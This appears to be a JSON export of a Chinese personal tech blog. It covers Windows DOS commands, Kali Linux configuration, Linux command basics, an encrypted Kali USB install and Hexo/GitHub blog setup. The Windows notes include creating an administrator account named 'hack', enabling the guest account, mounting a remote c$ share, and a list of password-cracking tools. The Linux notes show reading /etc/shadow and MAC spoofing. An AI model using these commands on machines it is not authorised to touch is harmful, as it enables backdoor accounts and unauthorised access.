ncpa.cpl 网络配置 notepad 记事本 control 控制面板 cmd shell calc 计算器 系统目录1.windows(系统安装目录)-&gt;System32(系统配置文件目录)-&gt;config-&gt;SAM (pe)2.Program Files/Program Files (x86) (程序默认安装目录)3.PerfLogs(日志)4.用户-&gt;启动 服务命令 services.msc 名 作用 dns 域名解析服务 dhcp 分发ip telnet 远程连接 ssh 同上 ftp 上传下载 smb 文件共享 端口 服务 端口号 http 80,8080,8090,3128,8081,9080 ftp 21 telnet 23 tftp 69/udp ssh 22/tcp pop3 110/tcp tomcat 8080 win2003远程登录 3389 orical 1521 mysql mssql 1433/tcp,1433/udp qq 1080/udp 通过端口可以 信息搜集，目标探测，服务判断，系统判断，系统角色分析 注册表命令：regedit 编写批处理文件密码爆破工具：U盘破解（sam）pe,lc5,彩虹表，hydra 快捷键win+e：计算机ctrl+shift+esc:任务管理器win+tab:3D桌面 手动清除木马开机启动项：% Run查询服务： services.msc网络端口： netstat -o (-anp) dos命令 命令 /? 多查多用 cmd: color a //cmd绿字黑底 ipconfig /allipconfig /releaseipconfig /renewsysteminfo 系统配置 (补丁) arp -a net view shutdown -s -t 180 -c “hack”shutdown -a cls //清屏 md seven //创建文件夹rd seven //删除文件夹 copy con c:/seven.txt //创建文件hello sevenCtrl+z type seven.txt //查看文件内容start seven.txt //打开文件查看内容start www.baidu.com //打开网页del seven.txt //删除文件 tree //文件目录树形输出 copy 文件 位置例 copy 1.txt c:\\windows ren //重命名 net start //服务net stop telnetnet start telnet net usernet user hack 12314dsf /addnet user localgroup administrators hack /addnet user hack /delnet user guest /active:yesnet user guest 123345 net password 123456 //更改系统登录密码 net share //查看本地开启的共享net share k: ipc$net share ipc$ /delnet share c$ /del net use k: \\ip\\c$net use k: \\192.168.1.122\\c$ //拽共享盘 netstat /?schtasks /?","categories":[],"tags":[{"name":"windoes","slug":"windoes","permalink":"http://yoursite.com/tags/windoes/"},{"name":"DOS命令","slug":"DOS命令","permalink":"http://yoursite.com/tags/DOS命令/"}]},{"title":"kali防火墙","slug":"kali之防火墙","date":"2019-03-20T00:10:49.000Z","updated":"2019-05-03T10:13:28.000Z","comments":true,"path":"2019/03/20/kali之防火墙/","link":"","permalink":"http://yoursite.com/2019/03/20/kali之防火墙/","excerpt":"基础配置","text":"基础配置 防火墙冰河博客kali关闭iptables安装 1apt-get install ufw 关闭 1ufw disable # To disable the firewall 开启 1ufw enable # To enable the firewall","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"linux ssh连接","slug":"kali ssh连接","date":"2019-03-20T00:09:39.000Z","updated":"2019-05-03T10:10:01.000Z","comments":true,"path":"2019/03/20/kali ssh连接/","link":"","permalink":"http://yoursite.com/2019/03/20/kali ssh连接/","excerpt":"SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。 百度百科","text":"SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。 百度百科 ssh连接123vim /etc/ssh/sshd.conf #ssh配置文件PasswordAuthentication yes #允许密码链接PubkeyAuthentication yes #允许秘钥登录 12345/etc/init.d/ssh status #查看状态/etc/init.d/ssh start #开启ssh/etc/init.d/ssh restart #重启sshupdate-rc.d ssh enable #打开开机自启update-rc.d ssh disabled #关闭开机自启 服务器免密互联修改hosts 修改hostname 可以通过hostname登录 ssh-keygen 生成秘钥，上传秘钥 修改sshd.config,开启秘钥登录","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"kali 安装软件","slug":"kali 安装软件","date":"2019-03-20T00:07:45.000Z","updated":"2019-05-03T10:34:34.000Z","comments":true,"path":"2019/03/20/kali 安装软件/","link":"","permalink":"http://yoursite.com/2019/03/20/kali 安装软件/","excerpt":"在Linux上安装软件包（deb,rpm..）","text":"在Linux上安装软件包（deb,rpm..） 安装软件包 浏览器插件，kali组件 中文输入法下载搜狗输入法(linux版)，在文件所在目录下，执行终端命令dpkg -i 文件名.deb安装软件如缺依赖包，执行apt-get install 依赖包名按提示输入命令apt --fix-broken install再次执行dpkg -i 文件名.deb打开 fcitx配置 enjoy!","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"kali 更新源","slug":"kali 更新源","date":"2019-03-20T00:06:19.000Z","updated":"2019-05-03T10:01:43.000Z","comments":true,"path":"2019/03/20/kali 更新源/","link":"","permalink":"http://yoursite.com/2019/03/20/kali 更新源/","excerpt":"kali源：用于kali更新，也可在ubunto和debian上安装kali工具","text":"kali源：用于kali更新，也可在ubunto和debian上安装kali工具 升级补丁,保持系统最新 1vim /etc/apt/sources.list #修改 更新源 文件 更新源 1234567891011#官方源deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib#中科大 Kali源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云kali源deb http://mirrors.aliyun.com/kali kali main non-free contribdeb-src http://mirrors.aliyun.com/kali kali main non-free contrib 12apt-get update #更新索引apt-get upgrade #根据索引，真正更新 在ubuntu,debian上更换源后，更新索引需要添加秘钥 1sudo apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6 ok,再更新索引吧！","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"kali之网络配置","slug":"kali之网络配置","date":"2019-03-20T00:04:14.000Z","updated":"2019-05-03T10:12:45.000Z","comments":true,"path":"2019/03/20/kali之网络配置/","link":"","permalink":"http://yoursite.com/2019/03/20/kali之网络配置/","excerpt":"基础配置","text":"基础配置 网络配置12345678910ifconfig eth0 #查询eth0网卡配置dhclient eth0 #向DHCP服务器发送请求自动获得IP地址 ifconfig eth0 192.168.1.10/24 #指定获得ip地址route add default gw 192.168.1.1 #指定网关netstat -nr #查询网关 route -n 添加路由,内部网段（网络地址，不是主机地址/32），网关，网卡 1route add -net 192.168.0.0/24 gw 192.168.1.100 eth0 配置DNS 12345vim etc/resolv.confnamaserver 8.8.8.8namaserver 114.114.114.114或echo nameserver 192.168.1.1 &gt; /etc/resolv.conf 这些ifconfig分配的IP和DNS在修改后从开机又会返回原值因此可在静态模式下，制定自己的网卡 网卡配置文件 1vim /etc/nerwork/interfaces 默认为动态 123456# The loopback network interfaceauto loiface lo inet loopbackauto eth0iface eth0 inet dhcp 静态为： 1234567891011121314151617# The loopback network interfaceauto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 172.28.34.88 #ipnetmask 255.255.255.192 #子网掩码gateway 172.28.34.126 #网关dns-namaservers 192.168.0.10 192.168.0.20 #dns服务器开机自动添加到dns文件内#up route add -net 172.168.5.0/24 gw 192.168.10.100 eth1 #开机添加路由配置#down route del -net 172.168.0.0/24 #关机删除掉路由配置#下面这两个可以不设置#network 192.168.20.0 #网络地址#broadcast 192.168.20.255 #广播地址","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"linux学习笔记","slug":"linux学习笔记","date":"2019-03-20T00:00:32.000Z","updated":"2019-05-11T16:50:34.109Z","comments":true,"path":"2019/03/20/linux学习笔记/","link":"","permalink":"http://yoursite.com/2019/03/20/linux学习笔记/","excerpt":"linux基础知识","text":"linux基础知识 目录结构bin 放普通用户也可以使用的命令sbin 放管理员才可以执行的命令boot 放启动(引导)配置文件dev 放存储设备的，例硬盘etc 放系统和应用程序的配置文件home 普通用户家目录lib 放函数库文件lib64 放64位函数库文件live-build build自己kali版本lost found 出现问题，错误，丢失的文件目录media mnt 挂载外来存储介质opt 安装外围的大型程序的proc 开机生成的配置文件root 主目录selinux linux的安全机制srv sys tmp 临时目录usr 也可安装外围程序var 存放经常变化的如日志，邮件的目录 求助命令指令的 –help 求助说明几乎linux上指令，在开发的时候，就被开发者将指令的语法与参数写入指令的操作过程中了 1ls --help 只能用来查询指令，一般用来做协助查询 man pageman 是 manual(操作说明)的简写； 1man ls 左上角的【ls(1)】(1)解释如下: 代号 代表内容 1 用户在shell环境中可以操作的指令或可执行文件 … … 5 配置文件或者是某些文件的格式 … … 8 系统管理员可使用的管理命令 … … man page内大致内容如下(前四个重要) 代号 内容 NAME 简短的指令，数据名称说明 SYNOPSIS 简短的指令下达语法 DESCRIPTION 较为完整的说明 OPTIONS 针对SYNOPSIS 中，列举出所有可用的选项的说明 man page 常用按键： 按键 反应 空格键 向下翻一页 [Page Down] 向下翻一页 [Page Up] 向上翻一页 [Home] 去到第一页 [End] 去到最后一页 /关键字 向下搜索 ?关键字 向上搜索 n,N 在 ？和 / 的基础上 n向下一个搜索，N反向搜索 q 退出 搜索特定的指令/文件的man page说明文件 123man -f man #等同 whatis [指令或是数据]（只能root用户使用）man 1 manman 7 man 1man -k man #搜列出所有含有关键字的说明文件，相当于 apropos [指令或是数据] (root用户) info page（kali无info）查询指令和文件的格式，与 man 相似，但是拆分为不同的节点 1info info 非联网的说明文件1/usr/share/doc 熟悉命令 命令字 [选项] [参数]linux 命令：用于实现某一功能的指令或程序，执行依赖于解释器程序，（/bin/bash）man 指令 #查询指令用法指令 –help #查询指令选项 unameuname -r //系统内核uname -a //系统详细信息which uname //查看位置 hostnemahostname //主机名 mkdir创建目录-p 递归创建 touch创建文件 ls浏览目录-l 长格式显示文件名，d-目录，-普通文件，c-字符型设备，l-链接文件，b-块设备（sda）f-堆栈文件，p-命令管道。drwxr-xr-x第一个字符后面有三个字符组，分别表示文件拥有者，文件用户组，系统其他用户。-a 多显示出以.命名的隐藏文件-h 显示大小，（3M)-R 递归浏览 –fulll-time 完整时间 1ls -lh --sort=size # 以文件大小排序,size可换为time,按时间排 cd进入目录. 当前目录.. 这个目录的上个目录 ln为文件或目录建立链接（link）-s 建立软链接文件（省略此项则显示硬链接） cp复制-r 递归复制整个目录树-p 保持源文件的属性不变-f 强制覆盖目录目标同名文件或目录-i 需要覆盖文件或目录时进行提醒 1cp ps ps1 # 拷贝ps 命名为ps1 rm-f 强行删除文件或目录，不进行提醒-i 删除文件或目录时提醒用户确定-r 递归删除整个目录树 mv移动 pwd查看当前的工作目录 cat查看文本文件内容，全部显示which catcat /etc/passwdcat /etc/shadow-n 显示行号 123date &gt; 1cat 1 2cat 1 2 &gt; 3 //合并 more按百分比显示文本内容，逐屏显示，enter:查看下一页， q: 退出 less不显示百分比，和more 类似，显示目录位置,q退出 tail默认显示最后10行-20 显示最后20行 1watch -n 2 tail -20 /var/log/messages # 每隔两秒显示查看日志变化最后20行（实时查看系统日志变化）有的发行版没有messages这个文件。 du统计目录及文件的空间占用情况 wc统计文件中行数，单词数量，字符数-l 行数-w 单词数-c 字符数 12wc 1.txt 会出现2 4 262是行数，4是单词数，26是字符数 find查找find [查找范围] [查找条件]-name 按文件名称查找-size 按大小查找-user 按文件属主查找-type 按文件类型查找 1find /etc -name \"resol*.conf\" 12find / -iname namp #从/查找不分大小写的nampfind . -name \"ps*\" -exec cp &#123;&#125; /tmp//&#123;&#125;.bak \\: #从本目录下搜索ps开头的文件，并拷贝到目标目录 -iname: 不分大小写， -name: 分大小写 whereis查找 如果是源码安装，不是本地包管理安装，会查找不到如果在whereis的数据库里（本地安装回生成一个whereis数据库），比find快updatedb 更新数据库-b 二进制文件 top监视系统性能参数 q退出，输入k 结束某进程 ps显示进程-ef 详细显示aus 显示的列信息稍有不同 grep筛选显示的内容配角：cat 12cat /etc/passwd # 查看操作系统的本地账号grep ssh /etc/passwd #只显示包含ssh的内容 ifconfig配角：maccharger 123ifconfig eth0 down #down掉eth0,再改Mac地址时，需要先执行这步maccharger -m 00:11:11:11:11:11 eth0 #改Mac地址ifconfig eth0 up #up eth0 修改的Mac只有在本次使用，改过后可能会上不了网，因为无线路由器绑定了mac地址，下次开机会恢复真实值 netstat查看网络的连接信息配角： egrep awk cut sort unip &gt; |-pantu tu为tcp,udp连接信息 1netstat -pantu | egrep -v '0.0.0.0|:::' | awk '&#123;print $5&#125;' | egrep 'and|Address' | cut -d ':' -f 1 | sort | uniq &gt; ip 命令行解读:查看tcp,udp连接信息，筛除掉0.0.0.0和:::的信息,只显示第五块（列）,又筛除and和Address, 查看以”:”为界分的第一块，排序，重复只显示一次，最终 覆盖 输出到ip内.“&gt;”改为”&gt;&gt;”追加输出到ip内。awk 和 cut 都是对行操作。管道：| 将多个命令在同一行输入，可以协作。 mount挂载目录操作 1mount -o loop klai.iso /media/cdrom #将kali.iso挂载到目标目录下 dmesg查看message内容 echo在当前窗口显示某些信息 1echo \"hello world!\" ping-c 次数 cal查看日历 date查看时间 压缩 归档12gzip ***.gz gzip -d ***.gz 12bzip2 ***.gzbzip2 -d ***.gz tar归档-c 创建归档文件-v 输出详细信息-f 表示使用归档文件-x 解开归档文件-t 列表查看包内的文件（不释放解包）-C 指定释放位置-p 解包时保留原始文件及目录的权限-z/j 调用gzip/bzip2程序 进行解压或压缩 123456789#归档打包，解包tar -cvf 4.tar 1 2 3 //将文件1 2 3 打包归档为4.tartar -xvf 4.tar //解包归档文件4.tar #压缩，解压gzip 4.tar 4.tar.gz tar zxvf 4.tar.gz //解压#压缩，解压bzip2 4.tar 4.tar.bz2tar jxvf 4.tar.bz2 //解压 管道符；无逻辑关系，顺序执行| 依次执行，每个都执行，前一个的正确输出作后一个的操作对象&amp; 依次执行，每个都执行&amp;&amp; 逻辑与，依次执行，执行成功则下一个，失败则退出|| 逻辑或，依次执行，执行成功则退出，失败则下一个 关机重启halt：关机reboot:重启 123who 查看目前有谁在线netstat -a #查看联机状态ps -aus #后台执行的程序 指令 作用 sync 数据同步写入磁盘 shutdown 常用关机命令 halt 关机命令，进入系统停止的模式 poweroff 关机命令，进入关机模式，直接关机没有提供电力欧 reboot 直接重启 suspend 进入休眠模式 关机指令大同小异，习惯用哪个就用哪个 shutdown -h 20:35 关机+时间 -r +30 “the system will reboot” 重启+时间 -k now “the system will reboot” 警告，但不会真关机，吓唬人的 安装软件rpm红帽的包格式aptyumdpkg vim set mouse-=a #鼠标右键全部功能开启，可跨文本 命令模式dd //删除光标行（剪切）ndd //删除多行， 例2ddu //撤销p //（剪切后）粘贴D //从光标处删除至行尾 A 行尾I 行首a 光标后i 光标前O 上一行插入o 下一行插入 插入模式esc返回命令模式 底行模式 12345678910: set nu: wq: q!: w/ 关键字 #向下搜索 n 下一个？关键字 #向上搜索: %s/XX/YY/g #全文替换,XX改为YY,g为不提示: 1,5s/XX/YY/g #1到5行: . #重复上一条命令: u #消上一条命令 shell快捷键ctrl+l:清屏ctrl+u/k:清空至行首/尾:强行换行tab：命令补全,文件补齐Ctrl+c：退出，相当于exitCtrl+ins：vim模式复制，相当于普通模式的 Ctrl+cShift+ins：vim模式粘贴，相当于普通模式的 Ctrl+vShift+PgUp/PgDn：上下翻页 改变文件属性与权限chgrp ：改变文件所属群组chown ：改变文件拥有者chmod ：改变文件的权限, SUID, SGID, SBIT 等等的特性 chgrp 要被改变的组名必须要在/etc/group 文件内存在才行，否则就会显示错误chown 要注意的是， 用户必须是已经存在系统中的账号，也就是在/etc/passwd 这个文件中有纪录的用户名称才能改变 改变群组1chgrp [-R] 群组名 文件或目录 选项与参数：-R : 进行递归(recursive)的持续变更，亦即连同次目录下的所有文件、目录都更新成为这个群组之意。常常用在变更某一目录内所有的文件之情况。 拷贝文件，改变所属：123cp .bashrc .bashrc_testls -la .bashrc* #查看到仍然属于rootchown bin .bashrc 改变权限数字类型改变文件权限 1chmod [-R] xyz 文件或目录 选项与参数：xyz : 就是刚刚提到的数字类型的权限属性，为 rwx 属性数值的相加。r:4,w:2,x:1-R : 进行递归(recursive)的持续变更，亦即连同次目录下的所有文件都会变更 每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的，例如当权限为： [-rwxrwx—] 分数则是：owner = rwx = 4+2+1 = 7group = rwx = 4+2+1 = 7others= — = 0+0+0 = 0所以等一下我们设定权限的变更时，该文件的权限数字就是 770 啦！变更权限的指令 chmod 的语法是这样的： 1chmod [-R] 770 文件或目录 符号类型改变文件权限u:user,g:grope,e:others,a:all+:加入，-：除去，=：设定 123chmod u=rwx,go=rx .bashrc #注意喔！那个 u=rwx,go=rx 是连在一起的，中间并没有任何空格符！chmod a+w .bashrc #全部加写权限ls -al .bashrc 对于文件的 rwx 来说， 主要都是针对『文件的内容』而言，与文件档名的存在与否没有关系喔！因为文件记录的是实际的数据嘛 组件 内容 迭代物件 r w x文件 详细资料data 文件文件夹 读到文件内容 修改文件内容 执行文件内容目录 档名 可分类抽屉 读到档名 修改档名 进入该目录的权限(key) 环境变量1echo $PATH 添加环境变量,将root目录添加到PATH中，可以在任何目录下，执行root目录下的命令 1PATH=“$&#123;PATH&#125;:/root” tmp是任何用户都能访问的目录，若将.目录加入到PATH中，则会变得很危险。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"shell命令","slug":"shell命令","permalink":"http://yoursite.com/tags/shell命令/"}]},{"title":"在usb上安装kali","slug":"在usb上安装kali","date":"2019-02-15T13:15:33.000Z","updated":"2019-05-03T10:20:23.000Z","comments":true,"path":"2019/02/15/在usb上安装kali/","link":"","permalink":"http://yoursite.com/2019/02/15/在usb上安装kali/","excerpt":"持久加密的usb系统","text":"持久加密的usb系统 在usb上安装kali kali安装位置 反馈 SD卡 kali的armel版本：刻录到sd卡上，启动像树莓这样的单板设备 USB 持久加密的usb系统 docker 主机 kali Linux 系统的主机 虚拟机 验证哈希值git bash here 1sha256sum &lt;file&gt; # &lt;file&gt;: 文件名， sha256sum：可换为cksum, md5sum, sha1sum cmd / powershell 1CertUtil -hashfile &lt;file&gt; MD5 # MD5：可换为sha1,sha256 对比：cmd -&gt; type &lt;下载的.sha256sum 文件&gt; 或 对比已给的哈希值 持久加密Usb安装（基于Live） 技术依赖LUKS：linux Unified Key Setup 磁盘分区加密规范（文件被放在加密的分区内）不依赖于操作系统的磁盘级加密后端：dm-crypt（组件）前端：cryptsetup（命令行工具）Windows：DoxBox（组件），可以查看LUKS加密的分区微软的bitlocker，磁盘级加密 windows系统下，直接用unetbootin刻录，成功做成usb启动盘，然后做kali linux 的 Live Usb。 Linux系统，操作如下：制作Usb启动盘将ios文件放在Linux系统内（位置随意），如果是Linux虚拟机可以用WinSCP上传或共享文件夹传输将镜像刻录到U盘，用unetbootin或命令行 1dd if=kali....iso of=/dev/sdb bs=1M # dd: 块复制命令,if: inputfile, of: outputfile, bs: 块大小。 查看进度，命令: 1watch -n 5 killall -USR1 dd # 5：5s, dd: dd命令 为U盘创建额外分区用磁盘分区工具 1parted 列出挂载的磁盘 1print devices 选中sdb 1select /dev/sdb 查看当前sdb的分区 1print 划分sdb分区 1mkpart primary 3063 7063 # primary: 主分区， 3063：始位置， 7063: 末位置。 Ctrl+C退出parted。 使用LUKS加密分区(前端的命令)加密sdb3 1cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb3 输入YES 和 密码 打开加密分区打开sdb3,挂在可读分区上，分区命名usb 1cryptsetup luksOpen /dev/sdb3 usb 输入密码下面是挂载位置 1ls /dev/mapper/usb 格式化加密分区+卷宗文件系统级格式化usb为文件系统格式 1mkfs ext4 /dev/mapper/usb # mkfs: 文件系统级格式化， ext4: 文件系统格式。 指定卷标 1e2label /dev/mapper/usb persistence # e2label: 设置卷标， persistence: 官方规定持久卷标 挂载加密分区，并创建persistence.conf文件新建目录 1mkdir -p /mnt/usb mount到新目录下 1mount /dev/mapper/usb /mnt/usb/ linux 使用标准，硬件设备mount到一个目录里，访问目录，就是访问设备，进行读写增删改查等操作。 把”/ union”传输给… 1echo &quot;/ union&quot; &gt; /mnt/usb/persistence.conf # .conf会被读取，以确认这个分区是加密分区 挂载卸载掉 1umount /dev/mapper/usb 清除掉加密分区 1cryptsetup luksClose /dev/mapper/usb 通过Usb重启 选择Live USB Encrypted Persistenceok!","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"my first blog","slug":"My-First-Blog","date":"2018-12-08T04:11:03.000Z","updated":"2019-08-11T09:38:11.742Z","comments":true,"path":"2018/12/08/My-First-Blog/","link":"","permalink":"http://yoursite.com/2018/12/08/My-First-Blog/","excerpt":"Hexo + Github 搭建Blog和每次博客的部署","text":"Hexo + Github 搭建Blog和每次博客的部署 准备工作安装git, node.js, hexo git下载地址：链接 安装后验证 1$ git --version 出现类似下面的版本号，皆为成功 git version 2.19.2.windows.1 node.js下载地址：链接 安装后验证 1$ node -v 出现类似下面的版本号(安装最新版本)： v10.14.1 安装Hexo 命令行输入(cmd): 1$ npm install -g hexo-cli 创建本地仓库文件夹：例F:\\mysite 右键点击该文件夹，Git Bash Here 1$ hexo init blog 初始化完成！ 本地运行1cd blog 1npm install 本地运行(如果4000端口被占用，使用 hexo service -p 5000 修改端口) 1$ hexo server 此时在浏览器输入 http://localhost:4000/ ,访问到博客界面 ssh连接创建Github账户略，随便百度一下 配置个人信息 在本地，右键网站根目录，点击Git Bash 输入下列命令， yourname 即为github注册时的用户名， youremail 为注册时的邮箱账号， 第三条命令生成密钥： 123$ git config --global user.name \"yourname\"$ git config --global user.email \"yourEmail\"$ ssh-keygen -t rsa -C \"yourEmail\" 此时在C:\\Users下你的当前账户文件夹下会有一个 .ssh 文件，找到id_rsa.pub文件，复制里面的内容，粘贴至GitHub中，点击右上角用户头像下的Settings，之后点击左侧的SSH and GPG keys，找到New SSH key点击，输入title，并将之前复制的内容粘贴到下面的key中，最后点击Add SSH key，完成： 配置Deployment 去博客总目录下的_config.yml文件中，添加如下（yourname就是GitHub的用户名）： 1234deploy: type: git repo: git@github.com:yourname/yourname.github.io.git branch: master 将本地仓库同步到github 在第一次生成以及部署之前，需要安装一个扩展： 1$ npm install hexo-deployer-git --save 清除生成的静态网页缓存数据 1$ hexo clean 生成文章对应的静态页面 1$ hexo g 部署本地站点到github命令 1$ hexo deploy","categories":[],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"http://yoursite.com/tags/博客搭建/"}]}]}